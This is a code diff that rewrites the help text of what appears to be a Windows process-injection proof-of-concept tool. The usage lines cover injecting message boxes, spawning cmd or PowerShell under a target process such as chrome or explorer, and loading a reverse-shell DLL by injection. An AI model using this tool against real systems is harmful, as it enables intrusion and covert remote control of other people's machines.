@@ -376,18 +376,35 @@ static void usage(const char* prog) {
     printf("  %s <target>                        target -> MessageBox (default text)\n", prog);
     printf("  %s <target> \"your message\"         target -> MessageBox with YOUR text\n", prog);
     printf("  %s <target> --spawn <program>      target -> spawn <program> as child\n", prog);
-    printf("  %s <target> --dll <path>            target -> LoadLibrary(path) (revshell)\n", prog);
+    printf("  %s <target> --dll <path>           target -> LoadLibrary(path) (revshell)\n", prog);
     printf("  %s --list                          list every injectable process\n", prog);
-    printf("  %s --help                          this help\n\n", prog);
-    printf("Target is a PID or a process name. Works on ANY x64 app you can open.\n\n");
-    printf("Examples:\n");
-    printf("  %s                                 default pop into MVTC\n", prog);
+    printf("  %s --help                          this help\n", prog);
+    printf("  %s --no-color                     disable ANSI colors\n\n", prog);
+    printf("Target is a PID or a process name. Use pop_x64.exe on x64 targets and\n");
+    printf("pop_x86.exe on x86 (WOW64) targets. DLL arch auto-switches if a sibling\n");
+    printf("(revshell_x86.dll / revshell_pure_dll.dll) sits in the same folder.\n\n");
+
+    printf("Common targets:\n");
     printf("  %s --list                          see what you can inject into\n", prog);
-    printf("  %s chrome                          default pop into chrome\n", prog);
-    printf("  %s explorer \"I was here\"            custom message in explorer\n", prog);
-    printf("  %s 1234 \"PWNED by m14r41\"           custom message in PID 1234\n", prog);
-    printf("  %s MVTC --spawn notepad.exe        spawn notepad as MVTC's child\n", prog);
-    printf("  %s MVTC --spawn \"cmd /k whoami\"    pop a cmd as MVTC's child\n", prog);
+    printf("  %s chrome                          by name (largest instance wins)\n", prog);
+    printf("  %s 1234                            by PID\n", prog);
+    printf("  %s notepad.exe                     by full image name\n\n", prog);
+
+    printf("Spawn small apps as a child of the target (good for PoC screenshots):\n");
+    printf("  %s <target> --spawn calc.exe             Calculator\n", prog);
+    printf("  %s <target> --spawn notepad.exe          Notepad\n", prog);
+    printf("  %s <target> --spawn mspaint.exe          Paint\n", prog);
+    printf("  %s <target> --spawn cmd.exe              a cmd window\n", prog);
+    printf("  %s <target> --spawn powershell.exe       PowerShell\n", prog);
+    printf("  %s <target> --spawn \"cmd /k whoami\"      cmd running whoami\n", prog);
+    printf("  %s <target> --spawn \"cmd /k systeminfo\"  cmd running systeminfo\n\n", prog);
+
+    printf("MessageBox (visible banner inside the target):\n");
+    printf("  %s explorer \"I was here\"           custom text in explorer\n", prog);
+    printf("  %s 1234 \"PWNED by m14r41\"           custom text in PID 1234\n\n", prog);
+
+    printf("Reverse shell (DLL injection):\n");
+    printf("  %s <target> --dll revshell_pure_dll.dll   auto-arch (x64/x86)\n", prog);
 }
 
 // Build shellcode that calls WinExec("program", SW_SHOWNORMAL); ret
